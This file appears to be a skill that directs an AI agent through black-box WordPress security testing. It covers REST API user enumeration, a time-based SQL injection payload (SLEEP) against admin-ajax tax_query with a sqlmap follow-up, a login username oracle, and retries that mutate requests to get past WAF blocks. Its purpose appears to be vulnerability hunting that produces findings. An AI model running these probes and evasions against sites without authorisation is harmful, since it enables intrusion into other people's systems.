---
name: wordpress
description: WordPress black-box hunts that must run as soon as WordPress is fingerprinted. REST user enum and admin-ajax tax_query timing first. WPScan is optional and must never block those probes.
---

# /wordpress (Judah)

Focused WordPress skill. A three-page marketing site is still in-play. Do not
wait for a rich capability map, methodology-card richness, or WPScan quota.

## Not in this pack

- Waiting on `execute_wpscan` (quota/token aborts are normal)
- Declaring the host clean after WhatWeb/Wappalyzer
- Dumping `wp_users` / writing posts / brute-forcing `wp-login.php`

## Loop

1. Confirm fingerprint (any one is enough): `generator` WordPress, `/wp-content/`,
   `/wp-includes/`, `/wp-json/`, `/wp-admin` 3xx, `xmlrpc.php`.
2. `check_cve_applicability` on the origin. Parse generator meta, Yoast HTML
   comments (`Yoast SEO plugin v24.3`), `?ver=` on `/wp-content/plugins/`, Server
   header. Version-in-range of a published CVE is a finding — quote the evidence
   and the affected range; note auth preconditions. Do not wait on WPScan.
3. `execute_curl` `GET {origin}/wp-json/wp/v2/users?per_page=100` (`-sS -D-`).
   HTTP 200 with `slug` / `name` → `submit_finding_candidate` then
   `create_finding` (CWE-200 user enumeration). 401/403/empty list → kill the
   card with that evidence. Do not require privileged impact.
4. `compare_requests` POST `{origin}/wp-admin/admin-ajax.php`
   `Content-Type: application/x-www-form-urlencoded`, timeout=20.
   - baseline: `action=loadmore&page=1&query={"tax_query":{"0":{"terms":["1"]}}}`
   - mutant: same with `terms=["1) AND (SELECT 1 FROM (SELECT SLEEP(2))x)-- -"]`
   Delta ≥ 1.5s → repeat SLEEP(4), then `execute_sqlmap --technique=BT` if
   timing holds. `create_finding` with the timing table.
   No delta → kill with the timing table. Status 200 alone is not a finding.
5. Login oracle: ONE POST `/wp-login.php` per discovered username. Compare
   "not registered" vs "incorrect password". No hydra/rockyou.
6. If a probe is blocked (WAF, 403, timeout): do not stop. Read the defense
   body and retry via `compare_requests` or `run_custom_probe` with one
   mutation (encoding, alternate param, `xmlrpc.php`). Then prove or kill.
7. OPTIONAL `execute_wpscan` for extra plugin CVE names. Skip on abort. Never
   block steps 2–4 on WPScan.

## Done

Origin + users-enum verdict + ajax timing table (or kill evidence) + whether
WPScan ran. Silence is a failure. Nuclei is leftover coverage only.
